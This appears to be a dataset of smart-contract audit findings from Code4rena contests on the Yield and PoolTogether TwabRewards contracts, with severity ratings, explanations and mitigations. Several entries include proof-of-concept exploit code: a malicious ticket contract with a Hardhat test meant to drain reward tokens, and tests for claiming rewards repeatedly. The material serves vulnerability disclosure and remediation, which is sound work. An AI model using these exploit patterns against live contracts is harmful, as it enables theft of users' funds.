12.md,Return values of batch operations are ignored,low,"Many batched operation functions return values ignored by the caller `batch()`. While this may be acceptable for the front-end, which picks up any state changes from such functions via emitted events, integrating protocols that make a call to `batch()` may require it to package and send back return values of all operations from the batch to react on-chain to the success/failure or other return values from such calls. Otherwise, they will be in the dark on the success/impact of batched operations they've triggered.

See issue [#46](https://github.com/code-423n4/2021-05-yield-findings/issues/46) for code examples.

Recommend packaging and sending back return values of all batched operations' functions to the caller of `batch()`."
12.md,Missing sender address check in `receive()` may lead to locked Ether,low,Recommend adding an address check in `receive()` of `Ladle.sol` to ensure the only address sending ETH being received in `receive()` is the Weth9 contract (similar to the check in `PoolRouter.sol`) for Ether withdrawal in `_exitEther()` as this will prevent stray Ether from being sent accidentally to this contract and getting locked.
12.md,Missing reentrancy guard and contract existence check for modules,low,"The protocol allows users to call registered modules via `delegateCall` in Module operation. It is not clear how these modules are validated before registration. If they are malicious, they could cause reentrancy in the `batch()` call because there is no reentrancy guard protection. If they are destructed, `delegateCall` will still return success because low-level calls do not check for contract existence. Both will cause an undetermined level of impact to the protocol, but the likelihood is low given the registration process and assumed validation there.

Eve manages to get her malicious module registered, which causes reentrancy or maliciously affects protocol accounts/operations due to the `delegateCall`.

Alternatively, Alice registers a benign module but then accidentally calls `selfDestruct` on it. The module delegation is successful but without any side effects because it doesn't exist anymore. See issue page for referenced code.

**Recommend:**
1. Ensure during module registration that modules are trustworthy without any possibility to cause reentrancies or self-destruct.
2. Add reentrancy guard on `batch()` and contract existence check on module before `delegateCall`"
12.md,Prevent the use of LOCK in `setRoleAdmin` to instead force the use of `lockRole`,low,"The LOCK role is special in `AccessControl` because it has itself as the admin role (like ROOT) but no members. This means that calling ```setRoleAdmin(msg.sig, LOCK)` ""means no one can grant/revoke that `msg.sig` role anymore, and it gets locked irreversibly. This means it disables admin-based permissioning management of that role and therefore is very powerful in its impact.

Given this, there is a special function `lockRole()`, which is specifically meant to enforce LOCK as the admin for the specified role parameter. For all other role admin creations, the generic `setRoleAdmin()` may be used. However, `setRoleAdmin()` does not prevent specifying the use of LOCK as the admin. If this is accidentally used, it leads to disabling that role's admin management, which is irreversibly similar to the `lockRole()` function.

It is safer to force admins to use `lockRole()` as the only way to set admin to LOCK and prevent the use of LOCK as the `adminRole` parameter in `setRoleAdmin()`, because doing so will make the intention of the caller clearer as `lockRole()` clearly has that functionality specified in its name and that's the only thing it does.

Alice who is the admin for `foo()` wants to give the admin rights to Bob (0xFFFFFFF0) but instead of calling `setRoleAdmin(foo.sig, 0xFFFFFFF0)`, she calls `setRoleAdmin(foo.sig, 0xFFFFFFFF)` where 0xFFFFFFFF is LOCK. This makes LOCK as the admin for `foo()` and prevents any further admin-based access control management for `foo()`.

Recommend preventing the use of LOCK as the `adminRole` parameter in `setRoleAdmin()`."
12.md,Incompatibility With Rebasing/Deflationary/Inflationary tokens,low,"Yield whitelists a rebasing/deflationary/inflationary token to be used as collateral or underlying by accident. This leads to miscalculations between internal `Cauldron` accounting and the balances in the token contracts.

Yield protocol allows different tokens to be used as collateral or underlying. The `Join` and `Pool` contracts do not appear to support rebasing/deflationary/inflationary tokens whose balance changes during transfers or over time. The necessary checks include at least verifying the number of tokens transferred to contracts before and after the actual transfer to infer any fees/interest. These seem to be absent as seen in the `_join()` call of `Join.sol` or in Pool contracts. The impact will be miscalculations between internal `Cauldron` accounting and the balances in the token contracts.

Yield currently manages this by approving only certain tokens to be used as collateral or underlying. Therefore, this is not an issue now as long as the tokens are determined to not be of the concerned kinds. However, this will become an issue if user-supplied tokens are accepted without the existing vetting.

**Recommend:**
1. Make sure token vetting accounts for any rebasing/inflation/deflation
2. Add support in contracts for such tokens before accepting user-supplied tokens"
12.md,`flashFeeFactor` is uninitialized at declaration leading to zero-fee flash loans enabled by default,low,"`flashFeeFactor` is uninitialized at declaration and so zero initially until set by `setFlashFeeFactor()`. As indicated in one of the explainer videos, the idea is to default to uint256.max to disable flash loans by default.

Currently, flash loans are enabled by default with a zero flash fee unless changed by `setFlashFeeFactor()`.

Recommend Initializing at declaration with a reasonable value which could be uint256.max to disable flash loans by default."
12.md,Multiple compiler versions allowing a wide range from 0.5.0 to >=0.8.0,low,"The project uses multiple compiler versions with most specifying ^0.8.0, some specifying >=0.8.0, which allows breaking versions >= 0.9.0 in the future if reused/redeployed, and some even allowing much older >= 0.5.0/0.6.0.

The dangers of allowing multiple compilers across breaking revisions are that the security bug fixes and features might differ across different contracts introducing vulnerabilities or giving a false sense of security.

For example, most contracts use ^0.8.0, which means they have default-checked arithmetic to prevent overflows/underflows without using OZ SafeMath. This doesn't apply to the few `(inherited)` contracts that may be compiled with <0.8.0 and have unchecked overflows/underflows.

**Recommend:**
1. Update all contracts to use pragma solidity ^0.8.0 or better a fixed version like 0.8.4
2. Deploy with the same compiler version which was used for testing"
12.md,Anyone can create a fake pool to trick unauthorized front-ends,low,"While many Yield protocol functions are authorized to be called from other Yield contracts, the `createPool()` function in `PoolFactory` is not authorized and is callable from anyone. This is only supposed to be called from the Wand function `addSeries()`, which takes a base asset, creates a corresponding fyToken, and then a pool with the two of them. Pool contracts are created deterministically using `Create2,` but fyTokens are not. If the fyToken were also created deterministically using `Create2`, or if the Wand created fyToken and the pool in two different transactions, thus making the fyToken address observable to an attacker, the attacker could front-run pool creation to deploy a fake pool and make the real pool creation fail. This is currently not possible.

However, anyone can create a fake pool with the real base asset address but a fake fyToken. If the threat model is extended to integrating contracts/front-ends that may assume all pools created (as indicated by emitted events) by `createPool` to be authentic ones (like the one created from the Wand), they may end up interacting or allow interactions with a fake pool which may lead to users losing funds.

Alice creates a front-end that observes `PoolCreated` events emitted by `createPool` to automatically list them as Yield pools. An attacker creates a fake pool with Dai as base asset and a corresponding fake/malicious fyToken contract. Users of Alice's front-end end up interacting with the fake Yield pool and losing funds.

Recommend considering adding auth to the `createPool` function and permissioning only `Wand` to access this function for creating pools."
12.md,In method `_update` on `Pool.sol` - Divide before multiply,low,"In the `Pool.sol` contract, there is the following code:

```solidity
function _update(
        uint128 baseBalance,
        uint128 fyBalance,
        uint112 _baseCached,
        uint112 _fyTokenCached
    ) private {
        ....

            cumulativeBalancesRatio +=
                (scaledFYTokenCached / _baseCached) *
                timeElapsed;
        ....
    }
```

The multiplication should always be placed at the end to avoid miscalculations like the following one:

```solidity
  a = (b/d)*c
  0 = (5/10)*2

  a = (b * c)/ 2
  1 = (5 * 2)/10
```

**- [albertocuestacanada (Yield) confirmed](https://github.com/code-423n4/2021-05-yield-findings/issues/61)**"
12.md,Implicit unsafe math,low,"`Ladle._close` (and many other occurrences) reverts the transaction on certain signed inputs that are negated and cast to unsigned integers.

```solidity
// Ladle._close calling it with art or ink as type(int128).min will crash
uint128 amt = _debtInBase(vault.seriesId, series, uint128(-art));
ilkJoin.exit(to, uint128(-ink))

// explanation
int128 art = type(int128).min; // -2^127
uint128 amt = uint128(-art); // this fails as -art=--2^127=2^127 cannot be represented in int128
```

Other places: `CauldronMath.add`, `Ladle._pour`, everywhere where `-int*` is used...

One cannot use the actual `type(int128).min` value for function parameters.

Recommend reverting with a meaningful error message as is done in the `/math/Cast*` functions."
12.md,Unsafe call to `.decimals`,low,"The `FYToken.constructor` performs an external call to `IERC20Metadata(address(IJoin(join_).asset())).decimals()`.
This function was optional in the initial ERC-20 and might fail for old tokens that did not implement it.

FyTokens cannot be created for tokens that implemented the old initial ERC20 without the `decimals` function.

Recommend considering using the helper function in the utils to retrieve it `SafeERC20Namer.tokenDecimals`, the same way the `Pool.constructor` works."
12.md,`_burnInternal` always returns 0 for fy tokens returned,low,"Function `_burnInternal` always returns 0 as a third parameter. It should return `tokensBurnt`, `tokenOut`, `fyTokenOut`.

Recommend returning (`tokensBurned`, `tokenOut`, `fyTokenOut`);"
12.md,ERC20 `approve` is vulnerable to the front-running,low,"The function `approve` is vulnerable to the front-running. This issue is described here: https://blog.smartdec.net/erc20-approve-issue-in-simple-words-a41aaf47bca6. A malicious delegate can scout for a change in approval and front-run that. It is more of a theoretical issue, but still, I want you to be aware of this and that.

Recommend introducing `increaseAllowance` / `decreaseAllowance functions`.

see [here](https://github.com/code-423n4/2021-05-yield-findings/issues/38#issuecomment-852913242) for full explanation."
12.md,external function `transferToPool` is pretty useless,low,"External function `transferToPool` is pretty useless and error-prone. It relies on the user not to leave these tokens in a separate tx; otherwise, it will just be feeding the bots. To use it directly, users will have to write their own custom smart contract and chain actions.

It would be better to remove this function, leaving the only way to invoke it via a batch function."
12.md,"function `redeem` should return ""redeemed"" amount",low,"Function `redeem` in contract `FYToken` should return ""redeemed"" amount. The return value is not used anywhere, but it's a mistake that it assigns 'redeemed' but returns 'amount'.

Recommend removing return sentence or explicitly returning `redeemed`."
12.md,Using stale `cToken` exchange rate,low,"The chi oracle in contract `CompoundMultiOracle` calls the function `exchangeRateStored` rather than `exchangeRateCurrent` to get the exchange rate from Compound. However, since the function `exchangeRateStored` does not accrue interest before calculating the exchange rate, the return data could be out-of-date and affect the results of `_mature` and `_accrual` in the contract `FYToken`.

Recommend using `exchangeRateStored` in the `peek` function (since it does not allow transactional operations), and `exchangeRateCurrent` in the `get` function of `CompoundMultiOracle`."
12.md,Missing zero-address validations,low,"While the codebase does a great job of input validation for parameters of all kinds (especially addresses), there are a few places where zero-address validations are missing. Even though none of them are catastrophic, resulting in obvious reverts, and can be reset given the permissioned/controlled interactions with the contracts. Nevertheless, it is helpful to add zero-address validations to be consistent and ensure the high availability of the protocol with resistance to accidental misconfigurations. See the issue page for more details."
64.md,`createPromotion()` Lack of input validation for `_epochDuration` can potentially freeze promotion creator's funds,high,"<https://github.com/pooltogether/v4-periphery/blob/0e94c54774a6fce29daf9cb23353208f80de63eb/contracts/TwabRewards.sol#L88-L116>

```solidity
function createPromotion(
    address _ticket,
    IERC20 _token,
    uint216 _tokensPerEpoch,
    uint32 _startTimestamp,
    uint32 _epochDuration,
    uint8 _numberOfEpochs
) external override returns (uint256) {
    _requireTicket(_ticket);

    uint256 _nextPromotionId = _latestPromotionId + 1;
    _latestPromotionId = _nextPromotionId;

    _promotions[_nextPromotionId] = Promotion(
        msg.sender,
        _ticket,
        _token,
        _tokensPerEpoch,
        _startTimestamp,
        _epochDuration,
        _numberOfEpochs
    );

    _token.safeTransferFrom(msg.sender, address(this), _tokensPerEpoch * _numberOfEpochs);

    emit PromotionCreated(_nextPromotionId);

    return _nextPromotionId;
}
```

In the current implementation of `createPromotion()`, `_epochDuration` is allowed to be `0`.

However, when `_epochDuration = 0`, it will be impossible for users to claim the rewards, and the promotion creator won't be able to cancel it.

#### Proof of Concept

1.  Alice called `createPromotion()` to create a promotion with the following parameters:
    *   \_token: `USDC`
    *   \_tokensPerEpoch: `10,000`
    *   \_epochDuration: `0`
    *   \_numberOfEpochs: `10`
2.  `100,000 USDC` was transferred from Alice to the `TwabRewards` contract;
3.  Users tries to `claimRewards()` but the transaction always revert at `_ticket.getAverageTotalSuppliesBetween()` -> `TwabLib.getAverageBalanceBetween()` due to div by 0.
4.  Alice tries to `cancelPromotion()` to retrieve the funds, but it always reverts at `_requirePromotionActive()` since the promotion already ended.

As a result, Alice's `100,000 USDC` is frozen in the contract.

#### Recommendation

Consider adding `require(_epochDuration > 0)` in `createPromotion()`.



 **PierrickGT (PoolTogether) confirmed and resolved:**
 > Implemented the suggested require: https://github.com/pooltogether/v4-periphery/blob/e0010b689fb170daac77af5f62abba7ca1397524/contracts/TwabRewards.sol#L126"
64.md,Backdated _startTimestamp can lead to loss of funds,high,"#### Impact

This can lead to loss of funds as there is no recovery function of funds stuck like this

#### Proof of Concept

1.  User A creates a new promotion using createPromotion function. By mistake he provides 1 year ago value for `\_startTimestamp` with promotion duration as 6 months

2.  Since there is no check to see that `\_startTimestamp > block.timestamp` so this promotion gets created

3.  User cannot claim this promotion if they were not having promotion tokens in the 1 year old promotion period. This means promotion amount remains with contract

4.  Even promotion creator cannot claim back his tokens since promotion end date has already passed so `cancelPromotion` will fail

5.  As there is no recovery token function in contract so even contract cant transfer this token and the tokens will remain in this contract with no one able to claim those

#### Recommended Mitigation Steps

Add below check in the `createPromotion` function
```solidity
function createPromotion(
    address _ticket,
    IERC20 _token,
    uint216 _tokensPerEpoch,
    uint32 _startTimestamp,
    uint32 _epochDuration,
    uint8 _numberOfEpochs
) external override returns (uint256) {
    require(_startTimestamp>block.timestamp,""should be after current time"");
}
```"
64.md,Continue claiming reqrds after numberOfEpochs are over,high,"#### Impact

When claiming rewards via `claimRewards()`, the function `\_calculateRewardAmount()` is called.
The function `\_calculateRewardAmount()` has a check to make sure the epoch is over

```solidity
  require(block.timestamp > _epochEndTimestamp, ""TwabRewards/epoch-not-over""); 
```

However neither functions check if the `\_epochId` is within the range of the reward epochs.
Ergo it is possible to continue claiming rewards after the reward period is over.
This only works as long as there are enough tokens in the contract. But this is the case when not everyone has claimed, or other rewards use the same token.

The proof of concept contains a simplified version of the contract, and shows how this can be done.
When run in remix you get the following output, while there is only 1 epoch.
`console.log:
 Claiming for epoch 1 1
 Claiming for epoch 2 1
 Claiming for epoch 3 1
 Claiming for epoch 4 1
 Claiming for epoch 5 1`

#### Proof of Concept

```solidity
 // SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.6;
import ""hardhat/console.sol"";  

contract TwabRewards {

    struct Promotion {
        uint216 tokensPerEpoch;
        uint32 startTimestamp;
        uint32 epochDuration;
        uint8 numberOfEpochs;
    }
    mapping(uint256 => Promotion) internal _promotions;
    uint256 internal _latestPromotionId;
    mapping(uint256 => mapping(address => uint256)) internal _claimedEpochs;
    
    constructor() {
        uint id=createPromotion(1,uint32(block.timestamp)-10,1,1);
        claimRewards(id,1);
        claimRewards(id,2);
        claimRewards(id,3);
        claimRewards(id,4);
        claimRewards(id,5);
    }
     
    function createPromotion(uint216 _tokensPerEpoch,uint32 _startTimestamp,uint32 _epochDuration,uint8 _numberOfEpochs) public  returns (uint256) {
        uint256 _nextPromotionId = _latestPromotionId + 1;
        _latestPromotionId = _nextPromotionId;
        _promotions[_nextPromotionId] = Promotion(_tokensPerEpoch,_startTimestamp,_epochDuration,_numberOfEpochs);
        return _nextPromotionId;
    }
 
    function claimRewards(
        uint256 _promotionId,
        uint256 _epochId
    ) public  returns (uint256) {
        Promotion memory _promotion = _getPromotion(_promotionId);
        address _user=address(0);
        uint256 _rewardsAmount;
        uint256 _userClaimedEpochs = _claimedEpochs[_promotionId][_user];

        for (uint256 index = 0; index < 1; index++) {
            require(
                !_isClaimedEpoch(_userClaimedEpochs, _epochId),
                ""TwabRewards/rewards-already-claimed""
            );
            _rewardsAmount += _calculateRewardAmount(_promotion, _epochId);
            _userClaimedEpochs = _updateClaimedEpoch(_userClaimedEpochs, _epochId);
        }
        _claimedEpochs[_promotionId][_user] = _userClaimedEpochs;
        console.log(""Claiming for epoch"",_epochId,_rewardsAmount);
        return _rewardsAmount;
    }

    function getPromotion(uint256 _promotionId) public view  returns (Promotion memory) {
        return _getPromotion(_promotionId);
    }
  function _getPromotion(uint256 _promotionId) internal view returns (Promotion memory) {
        return _promotions[_promotionId];
    }
    
    function _isClaimedEpoch(uint256 _userClaimedEpochs, uint256 _epochId) internal pure returns (bool)
    {
        return (_userClaimedEpochs >> _epochId) & uint256(1) == 1;
    }

 function _calculateRewardAmount(        
        Promotion memory _promotion,
        uint256 _epochId
    ) internal view returns (uint256) {
        uint256 _epochDuration = _promotion.epochDuration;
        uint256 _epochStartTimestamp = _promotion.startTimestamp + (_epochDuration * _epochId);
        uint256 _epochEndTimestamp = _epochStartTimestamp + _epochDuration;
        require(block.timestamp > _epochEndTimestamp, ""TwabRewards/epoch-not-over"");
        return 1;
    }

 function _updateClaimedEpoch(uint256 _userClaimedEpochs, uint256 _epochId) internal pure returns (uint256) {
        return _userClaimedEpochs | (uint256(1) << _epochId);
    }
  
    function _getCurrentEpochId(Promotion memory _promotion) internal view returns (uint256) {        
        return (block.timestamp - _promotion.startTimestamp) / _promotion.epochDuration;
    }
 
    function _getRemainingRewards(Promotion memory _promotion) internal view returns (uint256) {
        // _tokensPerEpoch * _numberOfEpochsLeft
        return
            _promotion.tokensPerEpoch *
            (_promotion.numberOfEpochs - _getCurrentEpochId(_promotion));
    }
 
}
```

#### Recommended Mitigation Steps

In the function `\_calculateRewardAmount()` add something like the following in the beginning after the require.
`if ( \_epochId >= \_promotion.numberOfEpochs) return 0;`"
64.md,cancelPromotion is too rigorous,high,"#### Impact

When you cancel a promotion with `cancelPromotion()` then the promotion is complete deleted.
This means no-one can claim any rewards anymore, because  `\_promotions\[\_promotionId]` no longer exists.

It also means all the unclaimed tokens (of the previous epochs) will stay locked in the contract.

#### Proof of Concept

<https://github.com/pooltogether/v4-periphery/blob/b520faea26bcf60371012f6cb246aa149abd3c7d/contracts/TwabRewards.sol#L119-L138>

```solidity
function cancelPromotion(uint256 _promotionId, address _to) ... {
    ...
    uint256 _remainingRewards = _getRemainingRewards(_promotion);
    delete _promotions[_promotionId];
    
```

#### Recommended Mitigation Steps

In the function `cancelPromotion()` lower the `numberOfEpochs` or set a state variable, to allow user to claim their rewards."
64.md,Malicious tickets can lead to the loss of all tokens,high,"#### Impact

It allows an attacker to retrieve all the tokens of each promotions.

#### Analysis

Anyone can create a new promotion using `createPromotion()`. An attacker can create a new malicious promotion with the following parameters:

*   the address of a malicious ticket smart contract
*   the token address from the targeted promotion(s)
*   optionally, `_numberOfEpochs` equal to 0 to create this promotion for free

The only verification made on the ticket address given by [\_requireTicket()](https://github.com/pooltogether/v4-periphery/blob/master/contracts/TwabRewards.sol#L230-L244) is that the smart contract must implement the `ITicket` interface.

The attacker can then call `claimRewards()` with its wallet address, the malicious promotion id and a single \_epochId for the sake of clarity.

1.  `_calculateRewardAmount()` is first called to get the reward amount with the following formula `(_promotion.tokensPerEpoch * _ticket.getAverageBalanceBetween()) / _ticket.getAverageTotalSuppliesBetween()`. The malicious ticket can return an arbitrary  `_averageBalance` and an `_averageTotalSupplies` of 1, leading to an arbitrary large reward amount.

2.  `_promotion.token.safeTransfer(_user, _rewardsAmount)` is called. It transfers the amount of tokens previously computed to the attacker.

The attacker receives the tokens of other promotions without having spent anything.

#### Proof of Concept

The malicious smart contract is a copy/paste of [TicketHarness.sol](https://github.com/pooltogether/v4-core/blob/master/contracts/test/TicketHarness.sol) and [Ticket.sol](https://github.com/pooltogether/v4-core/blob/master/contracts/Ticket.sol) with the following changes:
```solidity
/// @inheritdoc ITicket
function getAverageTotalSuppliesBetween(
    uint64[] calldata _startTimes,
    uint64[] calldata _endTimes
) external view override returns (uint256[] memory) {
    uint256[] memory _balances = new uint256[](1);
    _balances[0] = uint256(1);
    return _balances;
}

/// @inheritdoc ITicket
function getAverageBalanceBetween(
    address _user,
    uint64 _startTime,
    uint64 _endTime
) external view override returns (uint256) {
    return 1337;
}
```

The test for HardHat is:
```js
describe('exploit()', async () => {
    it('this shouldnt happen', async () => {
        const promotionIdOne = 1;
        const promotionIdTwo = 2;

        await expect(createPromotion(ticket.address))
            .to.emit(twabRewards, 'PromotionCreated')
            .withArgs(promotionIdOne);
        
        let evilTicketFactory = await getContractFactory('EvilTicket');
        let evilTicket = await evilTicketFactory.deploy('EvilTicket', 'TICK', 18, wallet1.address);
        let createPromotionTimestamp = (await ethers.provider.getBlock('latest')).timestamp;
        await expect(twabRewards.connect(wallet2).createPromotion(
            evilTicket.address,
            rewardToken.address,
            tokensPerEpoch,
            createPromotionTimestamp,
            1,//epochDuration,
            0,//epochsNumber,
        )).to.emit(twabRewards, 'PromotionCreated')
            .withArgs(promotionIdTwo);

        await increaseTime(100);
        const epochIds = ['100'];
        await twabRewards.connect(wallet2).claimRewards(wallet2.address, promotionIdTwo, epochIds);
    });
});
```
It results in the following error:
```
1) TwabRewards
    exploit()
        this shouldnt happen:
    Error: VM Exception while processing transaction: reverted with reason string 'ERC20: transfer amount exceeds balance'
    at TwabRewardsHarness.verifyCallResult (@openzeppelin/contracts/utils/Address.sol:209)
    at TwabRewardsHarness.functionCallWithValue (@openzeppelin/contracts/utils/Address.sol:132)
    at TwabRewardsHarness.functionCall (@openzeppelin/contracts/utils/Address.sol:94)
    at TwabRewardsHarness._callOptionalReturn (@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol:92)
    at TwabRewardsHarness.safeTransfer (@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol:25)
    at TwabRewardsHarness.claimRewards (contracts/TwabRewards.sol:186)
```
#### Recommended Mitigation Steps

Maybe add a whitelist of trusted tickets?"
64.md,Rewards can be claimed multiple times,high,"#### Impact

An attacker can claim its reward 256 \* `epochDuration` seconds after the timestamp at which the promotion started. The vulnerability allows him to claim a reward several times to retrieve all the tokens associated to the promotion.

#### Analysis

`claimRewards()` claim rewards for a given promotion and epoch. In order to prevent a user from claiming a reward multiple times, the mapping [\_claimedEpochs](https://github.com/pooltogether/v4-periphery/blob/ceadb25844f95f19f33cb856222e461ed8edf005/contracts/TwabRewards.sol#L32) keeps track of claimed rewards per user:
```solidity
/// @notice Keeps track of claimed rewards per user.
/// @dev _claimedEpochs[promotionId][user] => claimedEpochs
/// @dev We pack epochs claimed by a user into a uint256. So we can't store more than 255 epochs.
mapping(uint256 => mapping(address => uint256)) internal _claimedEpochs;
```
(The comment is wrong, epochs are packed into a uint256 which allows **256** epochs to be stored).

`_epochIds` is an array of `uint256`. For each `_epochId` in this array, `claimRewards()` checks that the reward associated to this `_epochId` isn't already claimed thanks to
`_isClaimedEpoch()`. [\_isClaimedEpoch()](https://github.com/pooltogether/v4-periphery/blob/ceadb25844f95f19f33cb856222e461ed8edf005/contracts/TwabRewards.sol#L371) checks that the bit `_epochId` of `_claimedEpochs` is unset:
```solidity
(_userClaimedEpochs >> _epochId) & uint256(1) == 1;
```
However, if `_epochId` is greater than 255, `_isClaimedEpoch()` always returns false. It allows an attacker to claim a reward several times.

[\_calculateRewardAmount()](https://github.com/pooltogether/v4-periphery/blob/ceadb25844f95f19f33cb856222e461ed8edf005/contracts/TwabRewards.sol#L289) just makes use of `_epochId` to tell whether the promotion is over.

#### Proof of Concept

The following test should result in a reverted transaction, however the transaction succeeds.
```js
it('should fail to claim rewards if one or more epochs have already been claimed', async () => {
    const promotionId = 1;

    const wallet2Amount = toWei('750');
    const wallet3Amount = toWei('250');

    await ticket.mint(wallet2.address, wallet2Amount);
    await ticket.mint(wallet3.address, wallet3Amount);

    await createPromotion(ticket.address);
    await increaseTime(epochDuration * 257);

    await expect(
        twabRewards.claimRewards(wallet2.address, promotionId, ['256', '256']),
    ).to.be.revertedWith('TwabRewards/rewards-already-claimed');
});
```
#### Recommended Mitigation Steps

A possible fix could be to change the type of `_epochId` to `uint8` in:

*   `_calculateRewardAmount()`
*   `_updateClaimedEpoch()`
*   `_isClaimedEpoch()`

and change the type of `_epochIds` to `uint8[]` in `claimRewards()`."
64.md,Contract does not work with fee-on transfer tokens,high,"#### Impact

There exist ERC20 tokens that charge a fee for every transfer.

This kind of token does not work correctly with the `TwabRewards` contract as the
rewards calculation for an user is based on `promotion.tokensPerEpoch` (see line [320](https://github.com/pooltogether/v4-periphery/blob/b520faea26bcf60371012f6cb246aa149abd3c7d/contracts/TwabRewards.sol#L320)).

However, the actual amount of tokens the contract holds could be less than
`promotion.tokensPerEpoch * promotion.numberOfEpochs` leading to not claimable
rewards for users claiming later than others.

#### Recommended Mitigation Steps

To disable fee-on transfer tokens for the contract, add the following code in
`createPromotion` around line 11:
```solidity
uint256 oldBalance = _token.balanceOf(address(this));
_token.safeTransferFrom(msg.sender, address(this), _tokensPerEpoch * _numberOfEpochs);
uint256 newBalance = _token.balanceOf(address(this));
require(oldBalance + _tokenPerEpoch * _numberOfEpochs == newBalance);
```"
64.md,`cancelPromotion()` Unable to cancel unstarted promotions,medium,"For unstarted promotions, `cancelPromotion()` will revert at `block.timestamp - _promotion.startTimestamp` in `_getCurrentEpochId()`.

Call stack: `cancelPromotion()` -> `_getRemainingRewards()` -> `_getCurrentEpochId()`.

<https://github.com/pooltogether/v4-periphery/blob/0e94c54774a6fce29daf9cb23353208f80de63eb/contracts/TwabRewards.sol#L331-L336>

```solidity
function _getRemainingRewards(Promotion memory _promotion) internal view returns (uint256) {
    // _tokensPerEpoch * _numberOfEpochsLeft
    return
        _promotion.tokensPerEpoch *
        (_promotion.numberOfEpochs - _getCurrentEpochId(_promotion));
}
```

<https://github.com/pooltogether/v4-periphery/blob/0e94c54774a6fce29daf9cb23353208f80de63eb/contracts/TwabRewards.sol#L276-L279>

```solidity
function _getCurrentEpochId(Promotion memory _promotion) internal view returns (uint256) {
    // elapsedTimestamp / epochDurationTimestamp
    return (block.timestamp - _promotion.startTimestamp) / _promotion.epochDuration;
}
```

#### Recommendation

Consider checking if `  _promotion.startTimestamp > block.timestamp ` and refund `_promotion.tokensPerEpoch * _promotion.numberOfEpochs` in `cancelPromotion()`."
64.md,getRewardsAmount doesn't check epochs haven't been claimed,medium,"#### Impact

In ITwabRewards.sol, it is claimed that `getRewardsAmount` should account for epochs that have already been claimed, and not include these epochs in the total amount (indeed, there is a line that says `@dev Will be 0 if user has already claimed rewards for the epoch.`)

However, no such check is done in the implementation of `getRewardsAmount`. This means that users will be shown rewardAmounts that are higher than they should be, and users will be confused when they are transferred fewer tokens than they are told they will. This would cause confusion, and people may begin to mistrust the contract since they think they are being transferred fewer tokens than they are owed.

#### Proof of Concept

See the implementation of `getRewardsAmount` here: <https://github.com/pooltogether/v4-periphery/blob/b520faea26bcf60371012f6cb246aa149abd3c7d/contracts/TwabRewards.sol#L209>

Notice that there are no checks that the epochs have not already been claimed. Compare this to `claimRewards` which *does* check for epochs that have already been claimed with the following require statement:
```solidity
require(!_isClaimedEpoch(_userClaimedEpochs, _epochId), ""TwabRewards/rewards-already-claimed"");
```

A similar check should be added `getRewardsAmount` so that previously claimed epochs are not included in the sum.

#### Recommended Mitigation Steps

Add a similar check for previously claimed epochs as described above."
64.md,Dust Token Balances Cannot Be Claimed By An `admin` Account,medium,"#### Impact

Users who have a small claim on rewards for various promotions, may not feasibly be able to claim these rewards as gas costs could outweigh the sum they receive in return. Hence, it is likely that a dust balance accrues overtime for tokens allocated for various promotions. Additionally, the `_calculateRewardAmount` calculation may result in truncated results, leading to further accrual of a dust balance. Therefore, it is useful that these funds do not go to waste.

#### Proof of Concept

<https://github.com/pooltogether/v4-periphery/blob/b520faea26bcf60371012f6cb246aa149abd3c7d/contracts/TwabRewards.sol#L162-L191>

#### Recommended Mitigation Steps

Consider allowing an `admin` account to skim a promotion's tokens if it has been inactive for a certain length of time. There are several potential implementations, in varying degrees of complexity. However, the solution should attempt to maximise simplicity while minimising the accrual of dust balances."
64.md,Unsafe uint64 casting may overflow,medium,"#### Impact

The `\_calculateRewardAmount` function casts epoch timestamps from uint256 to uint64 and these may overflow. The epochStartTimestamp value is a function of the user-supplied `\_epochId` value, which could be extremely large (up to 2\*\*255 – 1). While Solidity 0.8.x checks for overflows on arithmetic operations, it does not do so for casting – the OpenZeppelin SafeCast library offers this. The overflow condition could cause `\_epochStartTimestamp > \_epochEndTimestamp`, which the Ticket.sol getAverageBalanceBetween may not be expected to handle. The `\_epochStartTimestamp` could overflow to have a value before the actual start of the promotion, also impacting the rewards calculation.

#### Proof of Concept

There are 4 uint64 casting operations in the `\_calculateRewardAmount` function of `TwabRewards.sol`:
<https://github.com/pooltogether/v4-periphery/blob/b520faea26bcf60371012f6cb246aa149abd3c7d/contracts/TwabRewards.sol#L304-L312>

#### Recommended Mitigation Steps

While requiring `\_epochId <= 255` may help, it does not remove the issue entirely, because a very large `\_epochDuration` value can still cause an overflow in the product `(\_epochDuration \* \_epochId)` used in `\_epochStartTimestamp`. However, other options exist:

1.  Making these uint256 variables of type uint64 and therefore removing the casting of uint256 to the small uint64 would remove this risk and probably be the most gas-efficient solution.
2.  Add `require(_epochEndTimestamp > _epochStartTimestamp);` to line 299, next to the existing require statement and before the uint64 casting operations
3.  Use the OpenZeppelin SafeCast library to prevent unexpected overflows.



**PierrickGT (PoolTogether) confirmed and resolved:**
> Fixed by casting to `uint64`. Relevant code:
> https://github.com/pooltogether/v4-periphery/blob/e0010b689fb170daac77af5f62abba7ca1397524/contracts/TwabRewards.sol#L415-L417
> https://github.com/pooltogether/v4-periphery/blob/master/contracts/interfaces/ITwabRewards.sol#L26-L28"
64.md,Missing Check When Transferring Tokens Out For A Given Promotion,medium,"#### Impact

The `claimRewards` function is called upon by ticket holders who parse a set of `_epochIds` they wish to claim rewards on. An internal call is made to `_calculateRewardAmount` to calculate the correct reward amount owed to the user. Subsequently, the `_updateClaimedEpoch` function will set the epoch bit of the tracked `_claimedEpochs` mapping, ensuring an `epochId` cannot be claimed twice for a given promotion.

However, there may be inaccuracies in the `_calculateRewardAmount` function, which results in more tokens being sent out than allocated by a promotion creator. This severely impacts the ability for users to claim their owed tokens on other promotions.

#### Proof of Concept

<https://github.com/pooltogether/v4-periphery/blob/b520faea26bcf60371012f6cb246aa149abd3c7d/contracts/TwabRewards.sol#L162-L191>
```solidity
function claimRewards(
    address _user,
    uint256 _promotionId,
    uint256[] calldata _epochIds
) external override returns (uint256) {
    Promotion memory _promotion = _getPromotion(_promotionId);

    uint256 _rewardsAmount;
    uint256 _userClaimedEpochs = _claimedEpochs[_promotionId][_user];

    for (uint256 index = 0; index < _epochIds.length; index++) {
        uint256 _epochId = _epochIds[index];

        require(
            !_isClaimedEpoch(_userClaimedEpochs, _epochId),
            ""TwabRewards/rewards-already-claimed""
        );

        _rewardsAmount += _calculateRewardAmount(_user, _promotion, _epochId);
        _userClaimedEpochs = _updateClaimedEpoch(_userClaimedEpochs, _epochId);
    }

    _claimedEpochs[_promotionId][_user] = _userClaimedEpochs;

